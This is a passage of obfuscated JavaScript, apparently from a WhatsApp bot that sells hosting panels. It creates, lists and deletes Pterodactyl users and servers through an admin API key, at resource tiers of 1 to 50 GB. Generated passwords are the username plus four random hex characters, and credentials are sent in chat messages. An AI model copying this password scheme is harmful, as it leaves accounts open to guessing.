      case "cp9gbv2":
      case "cpunliv2":
        {
          if (global.tempuser == null) {
            return _0x16d835.reply("Nama/Username Tidak Di Temukan");
          }
          var _0x341ca0;
          var _0x2f831d;
          var _0xf8932d;
          if (_0x3e5c8f == "cp1gbv2") {
            _0x341ca0 = "1125";
            _0x2f831d = "1125";
            _0xf8932d = "40";
          } else if (_0x3e5c8f == "cp2gbv2") {
            _0x341ca0 = "2125";
            _0x2f831d = "2125";
            _0xf8932d = "60";
          } else if (_0x3e5c8f == "cp3gbv2") {
            _0x341ca0 = "3125";
            _0x2f831d = "3125";
            _0xf8932d = "80";
          } else if (_0x3e5c8f == "cp4gbv2") {
            _0x341ca0 = "4125";
            _0x2f831d = "4125";
            _0xf8932d = "100";
          } else if (_0x3e5c8f == "cp5gbv2") {
            _0x341ca0 = "5125";
            _0x2f831d = "5125";
            _0xf8932d = "120";
          } else if (_0x3e5c8f == "cp6gbv2") {
            _0x341ca0 = "6125";
            _0x2f831d = "6125";
            _0xf8932d = "140";
          } else if (_0x3e5c8f == "cp7gbv2") {
            _0x341ca0 = "7125";
            _0x2f831d = "7125";
            _0xf8932d = "160";
          } else if (_0x3e5c8f == "cp8gbv2") {
            _0x341ca0 = "8125";
            _0x2f831d = "8125";
            _0xf8932d = "180";
          } else if (_0x3e5c8f == "cp9gbv2") {
            _0x341ca0 = "9124";
            _0x2f831d = "9125";
            _0xf8932d = "200";
          } else if (_0x3e5c8f == "cpunliv2") {
            _0x341ca0 = "0";
            _0x2f831d = "0";
            _0xf8932d = "0";
          } else {
            _0x341ca0 = "0";
            _0x2f831d = "0";
            _0xf8932d = "0";
          }
          if (!_0x1d834a && !_0x2aaf9c) {
            return _0x3abc22(msg.owner);
          }
          let _0x192a4e = global.tempuser.toLowerCase();
          let _0x145438 = _0x192a4e + "@gmail.com";
          let _0x4f5304 = _0x2931f6(_0x192a4e);
          let _0x5dec83 = global.temppw;
          let _0x99d523 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x145438,
              username: _0x192a4e.toLowerCase(),
              first_name: _0x4f5304,
              last_name: "Server",
              language: "en",
              password: _0x5dec83.toString()
            })
          });
          let _0x17a72e = await _0x99d523.json();
          if (_0x17a72e.errors) {
            return _0x16d835.reply(JSON.stringify(_0x17a72e.errors[0], null, 2));
          }
          let _0x55cf6d = _0x17a72e.attributes;
          let _0x274f3a = _0x5a009b(Date.now());
          let _0x4595b0 = _0x55cf6d.id;
          let _0x4835c6 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x28912c = await _0x4835c6.json();
          let _0x17416a = _0x28912c.attributes.startup;
          const _0x5bb7a3 = {
            memory: _0x341ca0,
            swap: 0,
            disk: _0x2f831d,
            io: 500,
            cpu: _0xf8932d
          };
          let _0x55cc11 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x4f5304,
              description: _0x274f3a,
              user: _0x4595b0,
              egg: parseInt(egg),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x17416a,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x5bb7a3,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x19d877 = await _0x55cc11.json();
          if (_0x19d877.errors) {
            return _0x16d835.reply(JSON.stringify(_0x19d877.errors[0], null, 2));
          }
          let _0x25b9ad = _0x19d877.attributes;
          var _0x21927c;
          if (_0x570995) {
            _0x21927c = _0x16d835.sender;
            await _0x16d835.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat");
          } else {
            _0x21927c = _0x16d835.chat;
          }
          var _0x487964 = "\n*Berhasil Membuat Akun Panel ✅*\n\n* *ID :* " + _0x25b9ad.id + "\n* *Nama :* " + _0x4f5304 + "\n* *Ram :* " + (_0x341ca0 == "0" ? "Unlimited" : _0x341ca0.charAt(0) + "GB") + "\n* *CPU :* " + (_0xf8932d == "0" ? "Unlimited" : _0xf8932d + "%") + "\n* *Storage :* " + (_0x2f831d == "0" ? "Unlimited" : _0x2f831d.charAt(0) + "GB") + "\n* *Created :* " + _0x274f3a + "\n";
          const _0x5046cf = {
            text: _0x487964
          };
          const _0x479ed4 = {
            text: global.foother
          };
          let _0x4f7863 = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x5046cf),
                  footer: proto.Message.InteractiveMessage.Footer.create(_0x479ed4),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Login Server Panel\",\"url\":\"" + global.domain + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }, {
                      name: "cta_copy",
                      buttonParamsJson: "{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"" + _0x55cf6d.username + "\"}"
                    }, {
                      name: "cta_copy",
                      buttonParamsJson: "{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"" + global.temppw.toString() + "\"}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          await _0x59b98d.relayMessage(_0x21927c, _0x4f7863.message, {
            messageId: _0x4f7863.key.id
          });
          global.tempuser = null;
          global.temppw = null;
        }
        break;
      case "cp1gbv3":
      case "cp2gbv3":
      case "cp3gbv3":
      case "cp4gbv3":
      case "cp5gbv3":
      case "cp6gbv3":
      case "cp7gbv3":
      case "cp8gbv3":
      case "cp9gbv3":
      case "cpunliv3":
        {
          if (global.panel3 == null) {
            return _0x16d835.reply("Nama/Username Tidak Di Temukan");
          }
          var _0x341ca0;
          var _0x2f831d;
          var _0xf8932d;
          if (_0x3e5c8f == "cp1gbv3") {
            _0x341ca0 = "1125";
            _0x2f831d = "1125";
            _0xf8932d = "40";
          } else if (_0x3e5c8f == "cp2gbv3") {
            _0x341ca0 = "2125";
            _0x2f831d = "2125";
            _0xf8932d = "60";
          } else if (_0x3e5c8f == "cp3gbv3") {
            _0x341ca0 = "3125";
            _0x2f831d = "3125";
            _0xf8932d = "80";
          } else if (_0x3e5c8f == "cp4gbv3") {
            _0x341ca0 = "4125";
            _0x2f831d = "4125";
            _0xf8932d = "100";
          } else if (_0x3e5c8f == "cp5gbv3") {
            _0x341ca0 = "5125";
            _0x2f831d = "5125";
            _0xf8932d = "120";
          } else if (_0x3e5c8f == "cp6gbv3") {
            _0x341ca0 = "6125";
            _0x2f831d = "6125";
            _0xf8932d = "140";
          } else if (_0x3e5c8f == "cp7gbv3") {
            _0x341ca0 = "7125";
            _0x2f831d = "7125";
            _0xf8932d = "160";
          } else if (_0x3e5c8f == "cp8gbv3") {
            _0x341ca0 = "8125";
            _0x2f831d = "8125";
            _0xf8932d = "180";
          } else if (_0x3e5c8f == "cp9gbv3") {
            _0x341ca0 = "9124";
            _0x2f831d = "9125";
            _0xf8932d = "200";
          } else if (_0x3e5c8f == "cpunliv3") {
            _0x341ca0 = "0";
            _0x2f831d = "0";
            _0xf8932d = "0";
          } else {
            _0x341ca0 = "0";
            _0x2f831d = "0";
            _0xf8932d = "0";
          }
          if (!_0x1d834a && !_0x2aaf9c) {
            return _0x3abc22(msg.owner);
          }
          let _0x1ac768 = global.panel3[0].toLowerCase();
          let _0x1bf335 = _0x1ac768 + "@gmail.com";
          let _0x96cbba = _0x2931f6(_0x1ac768);
          let _0x307a0a = _0x1ac768 + crypto.randomBytes(2).toString("hex");
          let _0x37c19b = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x1bf335,
              username: _0x1ac768.toLowerCase(),
              first_name: _0x96cbba,
              last_name: "Server",
              language: "en",
              password: _0x307a0a.toString()
            })
          });
          let _0x3845c2 = await _0x37c19b.json();
          if (_0x3845c2.errors) {
            return _0x16d835.reply(JSON.stringify(_0x3845c2.errors[0], null, 2));
          }
          let _0x35d524 = _0x3845c2.attributes;
          let _0x41011c = _0x5a009b(Date.now());
          let _0x518df4 = _0x35d524.id;
          let _0x2e61c8 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x33364c = await _0x2e61c8.json();
          let _0x13dd57 = _0x33364c.attributes.startup;
          const _0x30a3d9 = {
            memory: _0x341ca0,
            swap: 0,
            disk: _0x2f831d,
            io: 500,
            cpu: _0xf8932d
          };
          let _0x5f2b71 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x96cbba,
              description: _0x41011c,
              user: _0x518df4,
              egg: parseInt(egg),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x13dd57,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x30a3d9,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x30127e = await _0x5f2b71.json();
          if (_0x30127e.errors) {
            return _0x16d835.reply(JSON.stringify(_0x30127e.errors[0], null, 2));
          }
          let _0x4768a0 = _0x30127e.attributes;
          await _0x16d835.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Nomor " + global.panel3[1].split("@")[0]);
          var _0x487964 = "\n*Berhasil Membuat Akun Panel ✅*\n\n* *ID :* " + _0x4768a0.id + "\n* *Nama :* " + _0x96cbba + "\n* *Ram :* " + (_0x341ca0 == "0" ? "Unlimited" : _0x341ca0.charAt(0) + "GB") + "\n* *CPU :* " + (_0xf8932d == "0" ? "Unlimited" : _0xf8932d + "%") + "\n* *Storage :* " + (_0x2f831d == "0" ? "Unlimited" : _0x2f831d.charAt(0) + "GB") + "\n* *Created :* " + _0x41011c + "\n";
          const _0x45aac8 = {
            text: _0x487964
          };
          const _0x13c1af = {
            text: global.foother
          };
          let _0x24d4fe = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x45aac8),
                  footer: proto.Message.InteractiveMessage.Footer.create(_0x13c1af),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Login Server Panel\",\"url\":\"" + global.domain + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }, {
                      name: "cta_copy",
                      buttonParamsJson: "{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"" + _0x35d524.username + "\"}"
                    }, {
                      name: "cta_copy",
                      buttonParamsJson: "{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"" + _0x307a0a.toString() + "\"}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          await _0x59b98d.relayMessage(global.panel3[1], _0x24d4fe.message, {
            messageId: _0x24d4fe.key.id
          });
          global.panel3 = null;
        }
        break;
      case "cp1gb":
      case "cp2gb":
      case "cp3gb":
      case "cp4gb":
      case "cp5gb":
      case "cp6gb":
      case "cp7gb":
      case "cp8gb":
      case "cp9gb":
      case "cp10gb":
      case "cp11gb":
      case "cp12gb":
      case "cp13gb":
      case "cp14gb":
      case "cp15gb":
      case "cp16gb":
      case "cp17gb":
      case "cp18gb":
      case "cp19gb":
      case "cp20gb":
      case "cp21gb":
      case "cp22gb":
      case "cp23gb":
      case "cp24gb":
      case "cp25gb":
      case "cp26gb":
      case "cp27gb":
      case "cp28gb":
      case "cp29gb":
      case "cp30gb":
      case "cp31gb":
      case "cp32gb":
      case "cp33gb":
      case "cp34gb":
      case "cp35gb":
      case "cp36gb":
      case "cp37gb":
      case "cp38gb":
      case "cp39gb":
      case "cp40gb":
      case "cp41gb":
      case "cp42gb":
      case "cp43gb":
      case "cp44gb":
      case "cp45gb":
      case "cp46gb":
      case "cp47gb":
      case "cp48gb":
      case "cp49gb":
      case "cp50gb":
      case "cpunli":
        {
          if (!_0x1d834a && !_0x2aaf9c) {
            return _0x3abc22(msg.owner);
          }
          if (global.panel == null) {
            return _0x16d835.reply("Nama/Username Tidak Di Temukan");
          }
          var _0x341ca0;
          var _0x2f831d;
          var _0xf8932d;
          if (_0x3e5c8f == "cp1gb") {
            _0x341ca0 = "1125";
            _0x2f831d = "1125";
            _0xf8932d = "40";
          } else if (_0x3e5c8f == "cp2gb") {
            _0x341ca0 = "2125";
            _0x2f831d = "2125";
            _0xf8932d = "60";
          } else if (_0x3e5c8f == "cp3gb") {
            _0x341ca0 = "3125";
            _0x2f831d = "3125";
            _0xf8932d = "80";
          } else if (_0x3e5c8f == "cp4gb") {
            _0x341ca0 = "4125";
            _0x2f831d = "4125";
            _0xf8932d = "100";
          } else if (_0x3e5c8f == "cp5gb") {
            _0x341ca0 = "5125";
            _0x2f831d = "5125";
            _0xf8932d = "120";
          } else if (_0x3e5c8f == "cp6gb") {
            _0x341ca0 = "6125";
            _0x2f831d = "6125";
            _0xf8932d = "140";
          } else if (_0x3e5c8f == "cp7gb") {
            _0x341ca0 = "7125";
            _0x2f831d = "7125";
            _0xf8932d = "160";
          } else if (_0x3e5c8f == "cp8gb") {
            _0x341ca0 = "8125";
            _0x2f831d = "8125";
            _0xf8932d = "180";
          } else if (_0x3e5c8f == "cp9gb") {
            _0x341ca0 = "9124";
            _0x2f831d = "9125";
            _0xf8932d = "200";
          } else if (_0x3e5c8f == "cp10gb") {
            _0x341ca0 = "10125";
            _0x2f831d = "10125";
            _0xf8932d = "220";
          } else if (_0x3e5c8f == "cp11gb") {
            _0x341ca0 = "11125";
            _0x2f831d = "11125";
            _0xf8932d = "360";
          } else if (_0x3e5c8f == "cp12gb") {
            _0x341ca0 = "12125";
            _0x2f831d = "12125";
            _0xf8932d = "390";
          } else if (_0x3e5c8f == "cp13gb") {
            _0x341ca0 = "13125";
            _0x2f831d = "13125";
            _0xf8932d = "420";
          } else if (_0x3e5c8f == "cp14gb") {
            _0x341ca0 = "14125";
            _0x2f831d = "14125";
            _0xf8932d = "450";
          } else if (_0x3e5c8f == "cp15gb") {
            _0x341ca0 = "15125";
            _0x2f831d = "15125";
            _0xf8932d = "480";
          } else if (_0x3e5c8f == "cp16gb") {
            _0x341ca0 = "16125";
            _0x2f831d = "16125";
            _0xf8932d = "510";
          } else if (_0x3e5c8f == "cp17gb") {
            _0x341ca0 = "17125";
            _0x2f831d = "17125";
            _0xf8932d = "540";
          } else if (_0x3e5c8f == "cp18gb") {
            _0x341ca0 = "18125";
            _0x2f831d = "18125";
            _0xf8932d = "570";
          } else if (_0x3e5c8f == "cp19gb") {
            _0x341ca0 = "19125";
            _0x2f831d = "19125";
            _0xf8932d = "600";
          } else if (_0x3e5c8f == "cp20gb") {
            _0x341ca0 = "20125";
            _0x2f831d = "20125";
            _0xf8932d = "630";
          } else if (_0x3e5c8f == "cp21gb") {
            _0x341ca0 = "21125";
            _0x2f831d = "21125";
            _0xf8932d = "660";
          } else if (_0x3e5c8f == "cp22gb") {
            _0x341ca0 = "22125";
            _0x2f831d = "22125";
            _0xf8932d = "660";
          } else if (_0x3e5c8f == "cp23gb") {
            _0x341ca0 = "23125";
            _0x2f831d = "23125";
            _0xf8932d = "690";
          } else if (_0x3e5c8f == "cp24gb") {
            _0x341ca0 = "24125";
            _0x2f831d = "24125";
            _0xf8932d = "720";
          } else if (_0x3e5c8f == "cp25gb") {
            _0x341ca0 = "25125";
            _0x2f831d = "25125";
            _0xf8932d = "750";
          } else if (_0x3e5c8f == "cp26gb") {
            _0x341ca0 = "26125";
            _0x2f831d = "26125";
            _0xf8932d = "780";
          } else if (_0x3e5c8f == "cp27gb") {
            _0x341ca0 = "27125";
            _0x2f831d = "27125";
            _0xf8932d = "810";
          } else if (_0x3e5c8f == "cp28gb") {
            _0x341ca0 = "28125";
            _0x2f831d = "28125";
            _0xf8932d = "840";
          } else if (_0x3e5c8f == "cp29gb") {
            _0x341ca0 = "29125";
            _0x2f831d = "29125";
            _0xf8932d = "870";
          } else if (_0x3e5c8f == "cp30gb") {
            _0x341ca0 = "30125";
            _0x2f831d = "30125";
            _0xf8932d = "900";
          } else if (_0x3e5c8f == "cp31gb") {
            _0x341ca0 = "31125";
            _0x2f831d = "31125";
            _0xf8932d = "930";
          } else if (_0x3e5c8f == "cp32gb") {
            _0x341ca0 = "32125";
            _0x2f831d = "32125";
            _0xf8932d = "960";
          } else if (_0x3e5c8f == "cp33gb") {
            _0x341ca0 = "33125";
            _0x2f831d = "33125";
            _0xf8932d = "990";
          } else if (_0x3e5c8f == "cp34gb") {
            _0x341ca0 = "34125";
            _0x2f831d = "34125";
            _0xf8932d = "1020";
          } else if (_0x3e5c8f == "cp35gb") {
            _0x341ca0 = "35125";
            _0x2f831d = "35125";
            _0xf8932d = "1050";
          } else if (_0x3e5c8f == "cp36gb") {
            _0x341ca0 = "36125";
            _0x2f831d = "35125";
            _0xf8932d = "1080";
          } else if (_0x3e5c8f == "cp37gb") {
            _0x341ca0 = "37125";
            _0x2f831d = "37125";
            _0xf8932d = "1110";
          } else if (_0x3e5c8f == "cp38gb") {
            _0x341ca0 = "38125";
            _0x2f831d = "38125";
            _0xf8932d = "1240";
          } else if (_0x3e5c8f == "cp39gb") {
            _0x341ca0 = "39125";
            _0x2f831d = "39125";
            _0xf8932d = "1270";
          } else if (_0x3e5c8f == "cp40gb") {
            _0x341ca0 = "40125";
            _0x2f831d = "40125";
            _0xf8932d = "1200";
          } else if (_0x3e5c8f == "cp41gb") {
            _0x341ca0 = "41125";
            _0x2f831d = "41125";
            _0xf8932d = "1230";
          } else if (_0x3e5c8f == "cp42gb") {
            _0x341ca0 = "42125";
            _0x2f831d = "42125";
            _0xf8932d = "1260";
          } else if (_0x3e5c8f == "cp43gb") {
            _0x341ca0 = "43125";
            _0x2f831d = "43125";
            _0xf8932d = "1290";
          } else if (_0x3e5c8f == "cp44gb") {
            _0x341ca0 = "44125";
            _0x2f831d = "44125";
            _0xf8932d = "1320";
          } else if (_0x3e5c8f == "cp45gb") {
            _0x341ca0 = "45125";
            _0x2f831d = "45125";
            _0xf8932d = "1350";
          } else if (_0x3e5c8f == "cp46gb") {
            _0x341ca0 = "46125";
            _0x2f831d = "46125";
            _0xf8932d = "1380";
          } else if (_0x3e5c8f == "cp47gb") {
            _0x341ca0 = "47125";
            _0x2f831d = "47125";
            _0xf8932d = "1410";
          } else if (_0x3e5c8f == "cp48gb") {
            _0x341ca0 = "48125";
            _0x2f831d = "48125";
            _0xf8932d = "1440";
          } else if (_0x3e5c8f == "cp49gb") {
            _0x341ca0 = "49125";
            _0x2f831d = "49125";
            _0xf8932d = "1470";
          } else if (_0x3e5c8f == "cp50gb") {
            _0x341ca0 = "50125";
            _0x2f831d = "50125";
            _0xf8932d = "1500";
          } else {
            _0x341ca0 = "0";
            _0x2f831d = "0";
            _0xf8932d = "0";
          }
          if (!_0x1d834a && !_0x2aaf9c) {
            return _0x3abc22(msg.owner);
          }
          let _0xa9d63e = global.panel[0].toLowerCase();
          let _0x16dfdb = _0xa9d63e + "@gmail.com";
          let _0x3cb74c = _0x2931f6(_0xa9d63e);
          let _0xcfa417 = _0xa9d63e + crypto.randomBytes(2).toString("hex");
          let _0x580115 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x16dfdb,
              username: _0xa9d63e.toLowerCase(),
              first_name: _0x3cb74c,
              last_name: "Server",
              language: "en",
              password: _0xcfa417.toString()
            })
          });
          let _0x3d6b1e = await _0x580115.json();
          if (_0x3d6b1e.errors) {
            return _0x16d835.reply(JSON.stringify(_0x3d6b1e.errors[0], null, 2));
          }
          let _0x1e88f3 = _0x3d6b1e.attributes;
          let _0x440fbd = _0x5a009b(Date.now());
          let _0x5d3c0e = _0x1e88f3.id;
          let _0x2839bd = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x3392c0 = await _0x2839bd.json();
          let _0x125423 = _0x3392c0.attributes.startup;
          const _0x72eec4 = {
            memory: _0x341ca0,
            swap: 0,
            disk: _0x2f831d,
            io: 500,
            cpu: _0xf8932d
          };
          let _0x4faf69 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x3cb74c,
              description: _0x440fbd,
              user: _0x5d3c0e,
              egg: parseInt(egg),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x125423,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x72eec4,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x3a2373 = await _0x4faf69.json();
          if (_0x3a2373.errors) {
            return _0x16d835.reply(JSON.stringify(_0x3a2373.errors[0], null, 2));
          }
          let _0x39f40d = _0x3a2373.attributes;
          var _0x21927c;
          if (_0x570995) {
            _0x21927c = _0x16d835.sender;
            await _0x16d835.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat");
          } else {
            _0x21927c = _0x16d835.chat;
          }
          var _0x487964 = "\n*Berhasil Membuat Akun Panel ✅*\n\n* *ID :* " + _0x39f40d.id + "\n* *Nama :* " + _0x3cb74c + "\n* *Ram :* " + (_0x341ca0 == "0" ? "Unlimited" : _0x341ca0.charAt(0) + "GB") + "\n* *CPU :* " + (_0xf8932d == "0" ? "Unlimited" : _0xf8932d + "%") + "\n* *Storage :* " + (_0x2f831d == "0" ? "Unlimited" : _0x2f831d.charAt(0) + "GB") + "\n* *Created :* " + _0x440fbd + "\n";
          const _0x57f13a = {
            text: _0x487964
          };
          const _0x4fa165 = {
            text: global.foother
          };
          const _0x444c71 = {
            name: "cta_url",
            buttonParamsJson: "{\"display_text\":\"Login Server Panel\",\"url\":\"" + global.domain + "\",\"merchant_url\":\"https://www.google.com\"}"
          };
          const _0x5da02d = {
            name: "cta_copy",
            buttonParamsJson: "{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"" + _0x1e88f3.username + "\"}"
          };
          let _0x1fa07d = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x57f13a),
                  footer: proto.Message.InteractiveMessage.Footer.create(_0x4fa165),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [_0x444c71, _0x5da02d, {
                      name: "cta_copy",
                      buttonParamsJson: "{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"" + _0xcfa417.toString() + "\"}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          await _0x59b98d.relayMessage(_0x21927c, _0x1fa07d.message, {
            messageId: _0x1fa07d.key.id
          });
          global.panel = null;
        }
        break;
      case "listpanel":
      case "listp":
      case "listserver":
        {
          if (global.apikey.length < 1) {
            return _0x16d835.reply("Apikey Tidak Ditemukan!");
          }
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          let _0x18a1c2 = await fetch(domain + "/api/application/servers?page=1", {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x52ec7a = await _0x18a1c2.json();
          let _0x24ec89 = _0x52ec7a.data;
          if (_0x24ec89.length < 1) {
            return _0x16d835.reply("Tidak Ada Server Bot");
          }
          let _0x3c81ec = "*LIST SERVER PANEL BOT⚡*\n\n";
          for (let _0x4eb43b of _0x24ec89) {
            let _0x6eb8eb = _0x4eb43b.attributes;
            let _0x10c71c = await fetch(domain + "/api/client/servers/" + _0x6eb8eb.uuid.split`-`[0] + "/resources", {
              method: "GET",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + capikey
              }
            });
            let _0x4def8d = await _0x10c71c.json();
            let _0x57c15e = _0x4def8d.attributes ? _0x4def8d.attributes.current_state : _0x6eb8eb.status;
            _0x3c81ec += "`📡ID Server " + _0x6eb8eb.id + "`\n* Nama Server : *" + _0x6eb8eb.name + "*\n* Ram : *" + (_0x6eb8eb.limits.memory == 0 ? "Unlimited" : _0x6eb8eb.limits.memory.length > 3 ? _0x6eb8eb.limits.memory.toString().charAt(1) + "GB" : _0x6eb8eb.limits.memory.toString().charAt(0) + "GB") + "*\n* CPU : *" + (_0x6eb8eb.limits.cpu == 0 ? "Unlimited" : _0x6eb8eb.limits.cpu.toString() + "%") + "*\n* Storage : *" + (_0x6eb8eb.limits.disk == 0 ? "Unlimited" : _0x6eb8eb.limits.disk.length > 3 ? _0x6eb8eb.limits.disk.toString().charAt(1) + "GB" : _0x6eb8eb.limits.disk.toString().charAt(0) + "GB") + "*\n* Created : " + _0x6eb8eb.created_at.split("T")[0] + "\n\n";
          }
          _0x3c81ec += " Total Server : *" + _0x52ec7a.meta.pagination.count + " Server*";
          const _0x2aecae = {
            text: _0x3c81ec
          };
          const _0xc53894 = {
            quoted: _0x1f415b
          };
          await _0x59b98d.sendMessage(_0x16d835.chat, _0x2aecae, _0xc53894);
        }
        break;
      case "delpanel":
      case "hapuspanel":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (global.apikey.length < 1) {
            return _0x16d835.reply("Apikey Tidak Ditemukan!");
          }
          if (!_0x57e1e7[0]) {
            return _0x16d835.reply(_0x286488("idservernya\n\nuntuk melihat id server ketik *.listpanel*"));
          }
          let _0x2a1694 = await fetch(domain + "/api/application/servers?page=1", {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x1f5b9e = await _0x2a1694.json();
          let _0x2270e8 = _0x1f5b9e.data;
          let _0x2605c8 = [];
          for (let _0x1d2ab7 of _0x2270e8) {
            let _0x280831 = _0x1d2ab7.attributes;
            if (_0x57e1e7[0] == _0x280831.id.toString()) {
              _0x2605c8.push(_0x280831.name.toLowerCase());
              let _0xc0265c = await fetch(domain + ("/api/application/servers/" + _0x280831.id), {
                method: "DELETE",
                headers: {
                  Accept: "application/json",
                  "Content-Type": "application/json",
                  Authorization: "Bearer " + apikey
                }
              });
              let _0x5a7a88 = _0xc0265c.ok ? {
                errors: null
              } : await _0xc0265c.json();
            }
          }
          let _0x13e3a7 = await fetch(domain + "/api/application/users?page=1", {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x2303cf = await _0x13e3a7.json();
          let _0x41f458 = _0x2303cf.data;
          for (let _0x119ef9 of _0x41f458) {
            let _0x4616f7 = _0x119ef9.attributes;
            if (_0x2605c8.includes(_0x4616f7.username)) {
              let _0x35f303 = await fetch(domain + ("/api/application/users/" + _0x4616f7.id), {
                method: "DELETE",
                headers: {
                  Accept: "application/json",
                  "Content-Type": "application/json",
                  Authorization: "Bearer " + apikey
                }
              });
              let _0x3b527e = _0x35f303.ok ? {
                errors: null
              } : await _0x35f303.json();
            }
          }
          if (_0x2605c8.length == 0) {
            return _0x16d835.reply("*ID Server/User* Tidak Ditemukan");
          }
          _0x16d835.reply("Berhasil Menghapus Akun Panel *" + _0x2931f6(_0x2605c8[0]) + "*");
        }
        break;
      case "payment":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          let _0x38073e = "\nSilahkan Pilih Payment Pembayaran Yang Tersedia Di Bawah Ini";
          const _0x323cc5 = {
            text: _0x38073e
          };
          const _0x2c0a0d = {
            text: global.foother
          };
          const _0x3f2c27 = {
